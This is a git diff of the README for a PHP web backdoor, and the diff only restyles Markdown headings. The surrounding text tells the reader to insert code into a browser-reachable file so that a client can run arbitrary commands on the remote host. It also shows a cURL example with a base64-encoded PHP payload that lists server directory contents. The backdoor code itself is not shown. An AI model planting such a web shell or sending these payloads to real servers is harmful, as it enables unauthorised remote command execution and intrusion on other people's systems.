@@ -1,7 +1,8 @@
-# Backdoor
-==========
+Backdoor
+========
 
-## Install
+Install
+-------
 
 Insert in document to which you have direct access from the browser, the following code
 
@@ -12,7 +13,8 @@ Insert in document to which you have direct access from the browser, the followi
 Open backdoor client in the browser to execute any the commands on remote host
 
 
-## Example use for cURL
+Example use for cURL
+--------------------
 
 ```shell
 # cHJpbnRfcihzY2FuZGlyKGRpcm5hbWUoX19GSUxFX18pKSk7 == base64_encode('print_r(scandir(dirname(__FILE__)));')
